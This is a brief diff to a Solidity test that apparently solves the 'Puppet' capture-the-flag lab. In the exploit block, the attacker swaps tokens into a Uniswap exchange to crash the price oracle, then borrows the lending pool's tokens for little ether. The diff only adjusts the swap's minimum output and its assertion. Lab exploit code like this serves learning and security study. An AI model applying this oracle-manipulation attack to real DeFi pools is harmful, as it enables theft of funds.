@@ -148,10 +148,10 @@ contract Puppet is DSTest, stdCheats {
         dvt.approve(address(uniswapExchange), ATTACKER_INITIAL_TOKEN_BALANCE);
         uint256 result = uniswapExchange.tokenToEthSwapInput(
             ATTACKER_INITIAL_TOKEN_BALANCE,
-            0.9 * 10e18,
+            9 * 1e18,
             DEADLINE
         );
-        assertGt(result, 0.9 ether);
+        assertGt(result, 9 ether);
         puppetPool.borrow{value: 20 ether}(100_000e18);
         vm.stopPrank();
         /** EXPLOIT END **/
